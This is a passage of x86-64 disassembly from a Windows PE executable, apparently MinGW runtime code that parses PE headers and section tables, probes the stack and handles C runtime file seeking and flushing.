  40accb:	48 8d 7c c3 28       	lea    0x28(%rbx,%rax,8),%rdi
  40acd0:	41 b8 08 00 00 00    	mov    $0x8,%r8d
  40acd6:	48 89 f2             	mov    %rsi,%rdx
  40acd9:	48 89 d9             	mov    %rbx,%rcx
  40acdc:	e8 97 08 00 00       	call   0x40b578
  40ace1:	85 c0                	test   %eax,%eax
  40ace3:	74 b0                	je     0x40ac95
  40ace5:	48 83 c3 28          	add    $0x28,%rbx
  40ace9:	48 39 fb             	cmp    %rdi,%rbx
  40acec:	75 e2                	jne    0x40acd0
  40acee:	31 db                	xor    %ebx,%ebx
  40acf0:	48 89 d8             	mov    %rbx,%rax
  40acf3:	48 83 c4 20          	add    $0x20,%rsp
  40acf7:	5b                   	pop    %rbx
  40acf8:	5e                   	pop    %rsi
  40acf9:	5f                   	pop    %rdi
  40acfa:	c3                   	ret
  40acfb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  40ad00:	48 83 ec 28          	sub    $0x28,%rsp
  40ad04:	4c 8b 0d 35 cb 00 00 	mov    0xcb35(%rip),%r9        # 0x417840
  40ad0b:	31 d2                	xor    %edx,%edx
  40ad0d:	66 41 81 39 4d 5a    	cmpw   $0x5a4d,(%r9)
  40ad13:	49 89 c8             	mov    %rcx,%r8
  40ad16:	74 08                	je     0x40ad20
  40ad18:	48 89 d0             	mov    %rdx,%rax
  40ad1b:	48 83 c4 28          	add    $0x28,%rsp
  40ad1f:	c3                   	ret
  40ad20:	4c 89 c9             	mov    %r9,%rcx
  40ad23:	e8 b8 fe ff ff       	call   0x40abe0
  40ad28:	85 c0                	test   %eax,%eax
  40ad2a:	74 ec                	je     0x40ad18
  40ad2c:	49 63 41 3c          	movslq 0x3c(%r9),%rax
  40ad30:	4c 89 c1             	mov    %r8,%rcx
  40ad33:	4c 29 c9             	sub    %r9,%rcx
  40ad36:	4c 01 c8             	add    %r9,%rax
  40ad39:	0f b7 50 14          	movzwl 0x14(%rax),%edx
  40ad3d:	48 8d 54 10 18       	lea    0x18(%rax,%rdx,1),%rdx
  40ad42:	0f b7 40 06          	movzwl 0x6(%rax),%eax
  40ad46:	85 c0                	test   %eax,%eax
  40ad48:	74 33                	je     0x40ad7d
  40ad4a:	83 e8 01             	sub    $0x1,%eax
  40ad4d:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  40ad51:	4c 8d 4c c2 28       	lea    0x28(%rdx,%rax,8),%r9
  40ad56:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40ad5d:	00 00 00 
  40ad60:	44 8b 42 0c          	mov    0xc(%rdx),%r8d
  40ad64:	4c 39 c1             	cmp    %r8,%rcx
  40ad67:	4c 89 c0             	mov    %r8,%rax
  40ad6a:	72 08                	jb     0x40ad74
  40ad6c:	03 42 08             	add    0x8(%rdx),%eax
  40ad6f:	48 39 c1             	cmp    %rax,%rcx
  40ad72:	72 a4                	jb     0x40ad18
  40ad74:	48 83 c2 28          	add    $0x28,%rdx
  40ad78:	4c 39 ca             	cmp    %r9,%rdx
  40ad7b:	75 e3                	jne    0x40ad60
  40ad7d:	31 d2                	xor    %edx,%edx
  40ad7f:	48 89 d0             	mov    %rdx,%rax
  40ad82:	48 83 c4 28          	add    $0x28,%rsp
  40ad86:	c3                   	ret
  40ad87:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40ad8e:	00 00 
  40ad90:	48 83 ec 28          	sub    $0x28,%rsp
  40ad94:	48 8b 15 a5 ca 00 00 	mov    0xcaa5(%rip),%rdx        # 0x417840
  40ad9b:	45 31 c0             	xor    %r8d,%r8d
  40ad9e:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
  40ada3:	74 0b                	je     0x40adb0
  40ada5:	44 89 c0             	mov    %r8d,%eax
  40ada8:	48 83 c4 28          	add    $0x28,%rsp
  40adac:	c3                   	ret
  40adad:	0f 1f 00             	nopl   (%rax)
  40adb0:	48 89 d1             	mov    %rdx,%rcx
  40adb3:	e8 28 fe ff ff       	call   0x40abe0
  40adb8:	85 c0                	test   %eax,%eax
  40adba:	74 e9                	je     0x40ada5
  40adbc:	48 63 42 3c          	movslq 0x3c(%rdx),%rax
  40adc0:	44 0f b7 44 10 06    	movzwl 0x6(%rax,%rdx,1),%r8d
  40adc6:	44 89 c0             	mov    %r8d,%eax
  40adc9:	48 83 c4 28          	add    $0x28,%rsp
  40adcd:	c3                   	ret
  40adce:	66 90                	xchg   %ax,%ax
  40add0:	48 83 ec 28          	sub    $0x28,%rsp
  40add4:	4c 8b 0d 65 ca 00 00 	mov    0xca65(%rip),%r9        # 0x417840
  40addb:	31 d2                	xor    %edx,%edx
  40addd:	66 41 81 39 4d 5a    	cmpw   $0x5a4d,(%r9)
  40ade3:	49 89 c8             	mov    %rcx,%r8
  40ade6:	74 08                	je     0x40adf0
  40ade8:	48 89 d0             	mov    %rdx,%rax
  40adeb:	48 83 c4 28          	add    $0x28,%rsp
  40adef:	c3                   	ret
  40adf0:	4c 89 c9             	mov    %r9,%rcx
  40adf3:	e8 e8 fd ff ff       	call   0x40abe0
  40adf8:	85 c0                	test   %eax,%eax
  40adfa:	74 ec                	je     0x40ade8
  40adfc:	49 63 41 3c          	movslq 0x3c(%r9),%rax
  40ae00:	4c 01 c8             	add    %r9,%rax
  40ae03:	0f b7 50 14          	movzwl 0x14(%rax),%edx
  40ae07:	48 8d 54 10 18       	lea    0x18(%rax,%rdx,1),%rdx
  40ae0c:	0f b7 40 06          	movzwl 0x6(%rax),%eax
  40ae10:	85 c0                	test   %eax,%eax
  40ae12:	74 24                	je     0x40ae38
  40ae14:	83 e8 01             	sub    $0x1,%eax
  40ae17:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  40ae1b:	48 8d 44 c2 28       	lea    0x28(%rdx,%rax,8),%rax
  40ae20:	f6 42 27 20          	testb  $0x20,0x27(%rdx)
  40ae24:	74 09                	je     0x40ae2f
  40ae26:	4d 85 c0             	test   %r8,%r8
  40ae29:	74 bd                	je     0x40ade8
  40ae2b:	49 83 e8 01          	sub    $0x1,%r8
  40ae2f:	48 83 c2 28          	add    $0x28,%rdx
  40ae33:	48 39 c2             	cmp    %rax,%rdx
  40ae36:	75 e8                	jne    0x40ae20
  40ae38:	31 d2                	xor    %edx,%edx
  40ae3a:	48 89 d0             	mov    %rdx,%rax
  40ae3d:	48 83 c4 28          	add    $0x28,%rsp
  40ae41:	c3                   	ret
  40ae42:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
  40ae49:	1f 84 00 00 00 00 00 
  40ae50:	48 83 ec 28          	sub    $0x28,%rsp
  40ae54:	4c 8b 05 e5 c9 00 00 	mov    0xc9e5(%rip),%r8        # 0x417840
  40ae5b:	31 d2                	xor    %edx,%edx
  40ae5d:	66 41 81 38 4d 5a    	cmpw   $0x5a4d,(%r8)
  40ae63:	74 0b                	je     0x40ae70
  40ae65:	48 89 d0             	mov    %rdx,%rax
  40ae68:	48 83 c4 28          	add    $0x28,%rsp
  40ae6c:	c3                   	ret
  40ae6d:	0f 1f 00             	nopl   (%rax)
  40ae70:	4c 89 c1             	mov    %r8,%rcx
  40ae73:	e8 68 fd ff ff       	call   0x40abe0
  40ae78:	85 c0                	test   %eax,%eax
  40ae7a:	49 0f 45 d0          	cmovne %r8,%rdx
  40ae7e:	48 89 d0             	mov    %rdx,%rax
  40ae81:	48 83 c4 28          	add    $0x28,%rsp
  40ae85:	c3                   	ret
  40ae86:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40ae8d:	00 00 00 
  40ae90:	48 83 ec 28          	sub    $0x28,%rsp
  40ae94:	4c 8b 05 a5 c9 00 00 	mov    0xc9a5(%rip),%r8        # 0x417840
  40ae9b:	31 c0                	xor    %eax,%eax
  40ae9d:	66 41 81 38 4d 5a    	cmpw   $0x5a4d,(%r8)
  40aea3:	48 89 ca             	mov    %rcx,%rdx
  40aea6:	74 08                	je     0x40aeb0
  40aea8:	48 83 c4 28          	add    $0x28,%rsp
  40aeac:	c3                   	ret
  40aead:	0f 1f 00             	nopl   (%rax)
  40aeb0:	4c 89 c1             	mov    %r8,%rcx
  40aeb3:	e8 28 fd ff ff       	call   0x40abe0
  40aeb8:	85 c0                	test   %eax,%eax
  40aeba:	74 ec                	je     0x40aea8
  40aebc:	49 63 40 3c          	movslq 0x3c(%r8),%rax
  40aec0:	48 89 d1             	mov    %rdx,%rcx
  40aec3:	4c 29 c1             	sub    %r8,%rcx
  40aec6:	49 01 c0             	add    %rax,%r8
  40aec9:	41 0f b7 50 06       	movzwl 0x6(%r8),%edx
  40aece:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
  40aed3:	85 d2                	test   %edx,%edx
  40aed5:	49 8d 44 00 18       	lea    0x18(%r8,%rax,1),%rax
  40aeda:	74 31                	je     0x40af0d
  40aedc:	83 ea 01             	sub    $0x1,%edx
  40aedf:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
  40aee3:	4c 8d 4c d0 28       	lea    0x28(%rax,%rdx,8),%r9
  40aee8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40aeef:	00 
  40aef0:	44 8b 40 0c          	mov    0xc(%rax),%r8d
  40aef4:	4c 39 c1             	cmp    %r8,%rcx
  40aef7:	4c 89 c2             	mov    %r8,%rdx
  40aefa:	72 08                	jb     0x40af04
  40aefc:	03 50 08             	add    0x8(%rax),%edx
  40aeff:	48 39 d1             	cmp    %rdx,%rcx
  40af02:	72 10                	jb     0x40af14
  40af04:	48 83 c0 28          	add    $0x28,%rax
  40af08:	4c 39 c8             	cmp    %r9,%rax
  40af0b:	75 e3                	jne    0x40aef0
  40af0d:	31 c0                	xor    %eax,%eax
  40af0f:	48 83 c4 28          	add    $0x28,%rsp
  40af13:	c3                   	ret
  40af14:	8b 40 24             	mov    0x24(%rax),%eax
  40af17:	f7 d0                	not    %eax
  40af19:	c1 e8 1f             	shr    $0x1f,%eax
  40af1c:	48 83 c4 28          	add    $0x28,%rsp
  40af20:	c3                   	ret
  40af21:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
  40af28:	0f 1f 84 00 00 00 00 
  40af2f:	00 
  40af30:	48 83 ec 28          	sub    $0x28,%rsp
  40af34:	4c 8b 1d 05 c9 00 00 	mov    0xc905(%rip),%r11        # 0x417840
  40af3b:	45 31 c9             	xor    %r9d,%r9d
  40af3e:	66 41 81 3b 4d 5a    	cmpw   $0x5a4d,(%r11)
  40af44:	41 89 c8             	mov    %ecx,%r8d
  40af47:	74 08                	je     0x40af51
  40af49:	4c 89 c8             	mov    %r9,%rax
  40af4c:	48 83 c4 28          	add    $0x28,%rsp
  40af50:	c3                   	ret
  40af51:	4c 89 d9             	mov    %r11,%rcx
  40af54:	e8 87 fc ff ff       	call   0x40abe0
  40af59:	85 c0                	test   %eax,%eax
  40af5b:	74 ec                	je     0x40af49
  40af5d:	49 63 4b 3c          	movslq 0x3c(%r11),%rcx
  40af61:	4c 01 d9             	add    %r11,%rcx
  40af64:	8b 81 90 00 00 00    	mov    0x90(%rcx),%eax
  40af6a:	85 c0                	test   %eax,%eax
  40af6c:	74 db                	je     0x40af49
  40af6e:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
  40af72:	48 8d 54 11 18       	lea    0x18(%rcx,%rdx,1),%rdx
  40af77:	0f b7 49 06          	movzwl 0x6(%rcx),%ecx
  40af7b:	85 c9                	test   %ecx,%ecx
  40af7d:	74 ca                	je     0x40af49
  40af7f:	83 e9 01             	sub    $0x1,%ecx
  40af82:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
  40af86:	4c 8d 54 ca 28       	lea    0x28(%rdx,%rcx,8),%r10
  40af8b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  40af90:	44 8b 4a 0c          	mov    0xc(%rdx),%r9d
  40af94:	4c 39 c8             	cmp    %r9,%rax
  40af97:	4c 89 c9             	mov    %r9,%rcx
  40af9a:	72 08                	jb     0x40afa4
  40af9c:	03 4a 08             	add    0x8(%rdx),%ecx
  40af9f:	48 39 c8             	cmp    %rcx,%rax
  40afa2:	72 1c                	jb     0x40afc0
  40afa4:	48 83 c2 28          	add    $0x28,%rdx
  40afa8:	4c 39 d2             	cmp    %r10,%rdx
  40afab:	75 e3                	jne    0x40af90
  40afad:	45 31 c9             	xor    %r9d,%r9d
  40afb0:	4c 89 c8             	mov    %r9,%rax
  40afb3:	48 83 c4 28          	add    $0x28,%rsp
  40afb7:	c3                   	ret
  40afb8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40afbf:	00 
  40afc0:	4c 01 d8             	add    %r11,%rax
  40afc3:	75 13                	jne    0x40afd8
  40afc5:	eb e6                	jmp    0x40afad
  40afc7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40afce:	00 00 
  40afd0:	41 83 e8 01          	sub    $0x1,%r8d
  40afd4:	48 83 c0 14          	add    $0x14,%rax
  40afd8:	8b 48 04             	mov    0x4(%rax),%ecx
  40afdb:	85 c9                	test   %ecx,%ecx
  40afdd:	75 07                	jne    0x40afe6
  40afdf:	8b 50 0c             	mov    0xc(%rax),%edx
  40afe2:	85 d2                	test   %edx,%edx
  40afe4:	74 c7                	je     0x40afad
  40afe6:	45 85 c0             	test   %r8d,%r8d
  40afe9:	7f e5                	jg     0x40afd0
  40afeb:	44 8b 48 0c          	mov    0xc(%rax),%r9d
  40afef:	4d 01 d9             	add    %r11,%r9
  40aff2:	4c 89 c8             	mov    %r9,%rax
  40aff5:	48 83 c4 28          	add    $0x28,%rsp
  40aff9:	c3                   	ret
  40affa:	90                   	nop
  40affb:	90                   	nop
  40affc:	90                   	nop
  40affd:	90                   	nop
  40affe:	90                   	nop
  40afff:	90                   	nop
  40b000:	51                   	push   %rcx
  40b001:	50                   	push   %rax
  40b002:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
  40b008:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
  40b00d:	72 19                	jb     0x40b028
  40b00f:	48 81 e9 00 10 00 00 	sub    $0x1000,%rcx
  40b016:	48 83 09 00          	orq    $0x0,(%rcx)
  40b01a:	48 2d 00 10 00 00    	sub    $0x1000,%rax
  40b020:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
  40b026:	77 e7                	ja     0x40b00f
  40b028:	48 29 c1             	sub    %rax,%rcx
  40b02b:	48 83 09 00          	orq    $0x0,(%rcx)
  40b02f:	58                   	pop    %rax
  40b030:	59                   	pop    %rcx
  40b031:	c3                   	ret
  40b032:	90                   	nop
  40b033:	90                   	nop
  40b034:	90                   	nop
  40b035:	90                   	nop
  40b036:	90                   	nop
  40b037:	90                   	nop
  40b038:	90                   	nop
  40b039:	90                   	nop
  40b03a:	90                   	nop
  40b03b:	90                   	nop
  40b03c:	90                   	nop
  40b03d:	90                   	nop
  40b03e:	90                   	nop
  40b03f:	90                   	nop
  40b040:	48 8d 44 24 08       	lea    0x8(%rsp),%rax
  40b045:	c3                   	ret
  40b046:	48 8d 05 17 05 03 00 	lea    0x30517(%rip),%rax        # 0x43b564
  40b04d:	ff 20                	jmp    *(%rax)
  40b04f:	90                   	nop
  40b050:	57                   	push   %rdi
  40b051:	56                   	push   %rsi
  40b052:	53                   	push   %rbx
  40b053:	48 83 ec 20          	sub    $0x20,%rsp
  40b057:	8b 41 18             	mov    0x18(%rcx),%eax
  40b05a:	48 8b 71 10          	mov    0x10(%rcx),%rsi
  40b05e:	89 c2                	mov    %eax,%edx
  40b060:	48 89 cb             	mov    %rcx,%rbx
  40b063:	83 e2 03             	and    $0x3,%edx
  40b066:	83 fa 02             	cmp    $0x2,%edx
  40b069:	74 15                	je     0x40b080
  40b06b:	31 c0                	xor    %eax,%eax
  40b06d:	48 89 33             	mov    %rsi,(%rbx)
  40b070:	c7 43 08 00 00 00 00 	movl   $0x0,0x8(%rbx)
  40b077:	48 83 c4 20          	add    $0x20,%rsp
  40b07b:	5b                   	pop    %rbx
  40b07c:	5e                   	pop    %rsi
  40b07d:	5f                   	pop    %rdi
  40b07e:	c3                   	ret
  40b07f:	90                   	nop
  40b080:	a9 08 01 00 00       	test   $0x108,%eax
  40b085:	74 e4                	je     0x40b06b
  40b087:	48 8b 39             	mov    (%rcx),%rdi
  40b08a:	31 c0                	xor    %eax,%eax
  40b08c:	48 29 f7             	sub    %rsi,%rdi
  40b08f:	48 85 ff             	test   %rdi,%rdi
  40b092:	7e d9                	jle    0x40b06d
  40b094:	e8 d7 05 00 00       	call   0x40b670
  40b099:	41 89 f8             	mov    %edi,%r8d
  40b09c:	48 89 f2             	mov    %rsi,%rdx
  40b09f:	89 c1                	mov    %eax,%ecx
  40b0a1:	e8 82 05 00 00       	call   0x40b628
  40b0a6:	48 98                	cltq
  40b0a8:	48 39 c7             	cmp    %rax,%rdi
  40b0ab:	75 23                	jne    0x40b0d0
  40b0ad:	8b 53 18             	mov    0x18(%rbx),%edx
  40b0b0:	89 d0                	mov    %edx,%eax
  40b0b2:	25 80 00 00 00       	and    $0x80,%eax
  40b0b7:	75 07                	jne    0x40b0c0
  40b0b9:	48 8b 73 10          	mov    0x10(%rbx),%rsi
  40b0bd:	eb ae                	jmp    0x40b06d
  40b0bf:	90                   	nop
  40b0c0:	83 e2 fd             	and    $0xfffffffd,%edx
  40b0c3:	48 8b 73 10          	mov    0x10(%rbx),%rsi
  40b0c7:	89 53 18             	mov    %edx,0x18(%rbx)
  40b0ca:	eb 9f                	jmp    0x40b06b
  40b0cc:	0f 1f 40 00          	nopl   0x0(%rax)
  40b0d0:	83 4b 18 20          	orl    $0x20,0x18(%rbx)
  40b0d4:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40b0d9:	48 8b 73 10          	mov    0x10(%rbx),%rsi
  40b0dd:	eb 8e                	jmp    0x40b06d
  40b0df:	90                   	nop
  40b0e0:	57                   	push   %rdi
  40b0e1:	56                   	push   %rsi
  40b0e2:	53                   	push   %rbx
  40b0e3:	48 83 ec 30          	sub    $0x30,%rsp
  40b0e7:	41 83 f8 01          	cmp    $0x1,%r8d
  40b0eb:	48 89 cb             	mov    %rcx,%rbx
  40b0ee:	48 89 d6             	mov    %rdx,%rsi
  40b0f1:	74 2d                	je     0x40b120
  40b0f3:	41 83 f8 02          	cmp    $0x2,%r8d
  40b0f7:	74 47                	je     0x40b140
  40b0f9:	45 85 c0             	test   %r8d,%r8d
  40b0fc:	75 65                	jne    0x40b163
  40b0fe:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
  40b103:	48 8d 7c 24 28       	lea    0x28(%rsp),%rdi
  40b108:	48 89 fa             	mov    %rdi,%rdx
  40b10b:	48 89 d9             	mov    %rbx,%rcx
  40b10e:	e8 ad 04 00 00       	call   0x40b5c0
  40b113:	48 83 c4 30          	add    $0x30,%rsp
  40b117:	5b                   	pop    %rbx
  40b118:	5e                   	pop    %rsi
  40b119:	5f                   	pop    %rdi
  40b11a:	c3                   	ret
  40b11b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  40b120:	48 8d 7c 24 28       	lea    0x28(%rsp),%rdi
  40b125:	48 89 fa             	mov    %rdi,%rdx
  40b128:	e8 b3 04 00 00       	call   0x40b5e0
  40b12d:	85 c0                	test   %eax,%eax
  40b12f:	75 44                	jne    0x40b175
  40b131:	48 01 74 24 28       	add    %rsi,0x28(%rsp)
  40b136:	eb d0                	jmp    0x40b108
  40b138:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40b13f:	00 
  40b140:	e8 ab 04 00 00       	call   0x40b5f0
  40b145:	48 8d 7c 24 28       	lea    0x28(%rsp),%rdi
  40b14a:	48 89 d9             	mov    %rbx,%rcx
  40b14d:	e8 1e 05 00 00       	call   0x40b670
  40b152:	89 c1                	mov    %eax,%ecx
  40b154:	e8 1f 05 00 00       	call   0x40b678
  40b159:	48 01 c6             	add    %rax,%rsi
  40b15c:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
  40b161:	eb a5                	jmp    0x40b108
  40b163:	e8 18 05 00 00       	call   0x40b680
  40b168:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
  40b16e:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40b173:	eb 9e                	jmp    0x40b113
  40b175:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40b17a:	eb 97                	jmp    0x40b113
  40b17c:	0f 1f 40 00          	nopl   0x0(%rax)
  40b180:	41 56                	push   %r14
  40b182:	41 55                	push   %r13
  40b184:	41 54                	push   %r12
  40b186:	55                   	push   %rbp
  40b187:	57                   	push   %rdi
  40b188:	56                   	push   %rsi
  40b189:	53                   	push   %rbx
  40b18a:	48 83 ec 30          	sub    $0x30,%rsp
  40b18e:	48 89 cb             	mov    %rcx,%rbx
  40b191:	e8 ea 04 00 00       	call   0x40b680
  40b196:	48 89 d9             	mov    %rbx,%rcx
  40b199:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
  40b19f:	e8 cc 04 00 00       	call   0x40b670
  40b1a4:	89 c5                	mov    %eax,%ebp
  40b1a6:	8b 43 08             	mov    0x8(%rbx),%eax
  40b1a9:	85 c0                	test   %eax,%eax
  40b1ab:	0f 88 1f 01 00 00    	js     0x40b2d0
  40b1b1:	31 d2                	xor    %edx,%edx
  40b1b3:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  40b1b9:	89 e9                	mov    %ebp,%ecx
  40b1bb:	e8 98 04 00 00       	call   0x40b658
  40b1c0:	48 85 c0             	test   %rax,%rax
  40b1c3:	48 89 c6             	mov    %rax,%rsi
  40b1c6:	0f 88 54 01 00 00    	js     0x40b320
  40b1cc:	8b 43 18             	mov    0x18(%rbx),%eax
  40b1cf:	a9 08 01 00 00       	test   $0x108,%eax
  40b1d4:	0f 84 d6 00 00 00    	je     0x40b2b0
  40b1da:	48 8b 0b             	mov    (%rbx),%rcx
  40b1dd:	48 8b 53 10          	mov    0x10(%rbx),%rdx
  40b1e1:	49 89 c9             	mov    %rcx,%r9
  40b1e4:	49 29 d1             	sub    %rdx,%r9
  40b1e7:	a8 03                	test   $0x3,%al
  40b1e9:	75 65                	jne    0x40b250
  40b1eb:	a8 80                	test   $0x80,%al
  40b1ed:	0f 84 e0 01 00 00    	je     0x40b3d3
  40b1f3:	4c 89 cf             	mov    %r9,%rdi
  40b1f6:	48 85 f6             	test   %rsi,%rsi
  40b1f9:	0f 84 e1 00 00 00    	je     0x40b2e0
  40b1ff:	a8 01                	test   $0x1,%al
  40b201:	0f 84 eb 00 00 00    	je     0x40b2f2
  40b207:	48 63 43 08          	movslq 0x8(%rbx),%rax
  40b20b:	85 c0                	test   %eax,%eax
  40b20d:	0f 84 fd 00 00 00    	je     0x40b310
  40b213:	4c 8b 35 46 c6 00 00 	mov    0xc646(%rip),%r14        # 0x417860
  40b21a:	49 01 c1             	add    %rax,%r9
  40b21d:	41 89 ed             	mov    %ebp,%r13d
  40b220:	41 89 ec             	mov    %ebp,%r12d
  40b223:	41 c1 fd 05          	sar    $0x5,%r13d
  40b227:	41 83 e4 1f          	and    $0x1f,%r12d
  40b22b:	4d 63 ed             	movslq %r13d,%r13
  40b22e:	49 c1 e4 06          	shl    $0x6,%r12
  40b232:	49 8b 06             	mov    (%r14),%rax
  40b235:	4a 8b 04 e8          	mov    (%rax,%r13,8),%rax
  40b239:	42 80 7c 20 08 00    	cmpb   $0x0,0x8(%rax,%r12,1)
  40b23f:	0f 88 eb 00 00 00    	js     0x40b330
  40b245:	48 89 f8             	mov    %rdi,%rax
  40b248:	4c 29 ce             	sub    %r9,%rsi
  40b24b:	e9 a5 00 00 00       	jmp    0x40b2f5
  40b250:	4c 8b 05 09 c6 00 00 	mov    0xc609(%rip),%r8        # 0x417860
  40b257:	41 89 ea             	mov    %ebp,%r10d
  40b25a:	4c 89 cf             	mov    %r9,%rdi
  40b25d:	41 c1 fa 05          	sar    $0x5,%r10d
  40b261:	4d 63 d2             	movslq %r10d,%r10
  40b264:	4d 8b 18             	mov    (%r8),%r11
  40b267:	41 89 e8             	mov    %ebp,%r8d
  40b26a:	41 83 e0 1f          	and    $0x1f,%r8d
  40b26e:	49 c1 e0 06          	shl    $0x6,%r8
  40b272:	4f 03 04 d3          	add    (%r11,%r10,8),%r8
  40b276:	41 80 78 08 00       	cmpb   $0x0,0x8(%r8)
  40b27b:	0f 89 75 ff ff ff    	jns    0x40b1f6
  40b281:	48 39 d1             	cmp    %rdx,%rcx
  40b284:	0f 86 69 ff ff ff    	jbe    0x40b1f3
  40b28a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  40b290:	45 31 c0             	xor    %r8d,%r8d
  40b293:	80 3a 0a             	cmpb   $0xa,(%rdx)
  40b296:	41 0f 94 c0          	sete   %r8b
  40b29a:	48 83 c2 01          	add    $0x1,%rdx
  40b29e:	4c 01 c7             	add    %r8,%rdi
  40b2a1:	48 39 d1             	cmp    %rdx,%rcx
  40b2a4:	75 ea                	jne    0x40b290
  40b2a6:	e9 4b ff ff ff       	jmp    0x40b1f6
  40b2ab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  40b2b0:	48 63 43 08          	movslq 0x8(%rbx),%rax
  40b2b4:	48 29 c6             	sub    %rax,%rsi
  40b2b7:	48 89 f0             	mov    %rsi,%rax
  40b2ba:	48 83 c4 30          	add    $0x30,%rsp
  40b2be:	5b                   	pop    %rbx
  40b2bf:	5e                   	pop    %rsi
  40b2c0:	5f                   	pop    %rdi
  40b2c1:	5d                   	pop    %rbp
  40b2c2:	41 5c                	pop    %r12
  40b2c4:	41 5d                	pop    %r13
  40b2c6:	41 5e                	pop    %r14
  40b2c8:	c3                   	ret
  40b2c9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  40b2d0:	c7 43 08 00 00 00 00 	movl   $0x0,0x8(%rbx)
  40b2d7:	e9 d5 fe ff ff       	jmp    0x40b1b1
  40b2dc:	0f 1f 40 00          	nopl   0x0(%rax)
  40b2e0:	48 89 f8             	mov    %rdi,%rax
  40b2e3:	48 83 c4 30          	add    $0x30,%rsp
  40b2e7:	5b                   	pop    %rbx
  40b2e8:	5e                   	pop    %rsi
  40b2e9:	5f                   	pop    %rdi
  40b2ea:	5d                   	pop    %rbp
  40b2eb:	41 5c                	pop    %r12
  40b2ed:	41 5d                	pop    %r13
  40b2ef:	41 5e                	pop    %r14
  40b2f1:	c3                   	ret
  40b2f2:	48 89 f8             	mov    %rdi,%rax
  40b2f5:	48 01 f0             	add    %rsi,%rax
  40b2f8:	48 83 c4 30          	add    $0x30,%rsp
  40b2fc:	5b                   	pop    %rbx
  40b2fd:	5e                   	pop    %rsi
  40b2fe:	5f                   	pop    %rdi
  40b2ff:	5d                   	pop    %rbp
  40b300:	41 5c                	pop    %r12
  40b302:	41 5d                	pop    %r13
  40b304:	41 5e                	pop    %r14
  40b306:	c3                   	ret
  40b307:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40b30e:	00 00 
  40b310:	31 c0                	xor    %eax,%eax
  40b312:	45 31 c9             	xor    %r9d,%r9d
  40b315:	e9 2e ff ff ff       	jmp    0x40b248
  40b31a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  40b320:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
  40b327:	eb 91                	jmp    0x40b2ba
  40b329:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  40b330:	31 d2                	xor    %edx,%edx
  40b332:	41 b8 02 00 00 00    	mov    $0x2,%r8d
  40b338:	89 e9                	mov    %ebp,%ecx
  40b33a:	4c 89 4c 24 28       	mov    %r9,0x28(%rsp)
  40b33f:	e8 14 03 00 00       	call   0x40b658
  40b344:	4c 8b 4c 24 28       	mov    0x28(%rsp),%r9
  40b349:	48 39 c6             	cmp    %rax,%rsi
  40b34c:	75 39                	jne    0x40b387
  40b34e:	48 8b 43 10          	mov    0x10(%rbx),%rax
  40b352:	4a 8d 0c 08          	lea    (%rax,%r9,1),%rcx
  40b356:	48 39 c8             	cmp    %rcx,%rax
  40b359:	73 19                	jae    0x40b374
  40b35b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  40b360:	31 d2                	xor    %edx,%edx
  40b362:	80 38 0a             	cmpb   $0xa,(%rax)
  40b365:	0f 94 c2             	sete   %dl
  40b368:	48 83 c0 01          	add    $0x1,%rax
  40b36c:	49 01 d1             	add    %rdx,%r9
  40b36f:	48 39 c1             	cmp    %rax,%rcx
  40b372:	75 ec                	jne    0x40b360
  40b374:	f6 43 19 20          	testb  $0x20,0x19(%rbx)
  40b378:	0f 84 c7 fe ff ff    	je     0x40b245
  40b37e:	49 83 c1 01          	add    $0x1,%r9
  40b382:	e9 be fe ff ff       	jmp    0x40b245
  40b387:	45 31 c0             	xor    %r8d,%r8d
  40b38a:	48 89 f2             	mov    %rsi,%rdx
  40b38d:	89 e9                	mov    %ebp,%ecx
  40b38f:	4c 89 4c 24 28       	mov    %r9,0x28(%rsp)
  40b394:	e8 bf 02 00 00       	call   0x40b658
  40b399:	4c 8b 4c 24 28       	mov    0x28(%rsp),%r9
  40b39e:	49 81 f9 00 02 00 00 	cmp    $0x200,%r9
  40b3a5:	77 13                	ja     0x40b3ba
  40b3a7:	8b 43 18             	mov    0x18(%rbx),%eax
  40b3aa:	41 b9 00 02 00 00    	mov    $0x200,%r9d
  40b3b0:	25 08 04 00 00       	and    $0x408,%eax
  40b3b5:	83 f8 08             	cmp    $0x8,%eax
  40b3b8:	74 04                	je     0x40b3be
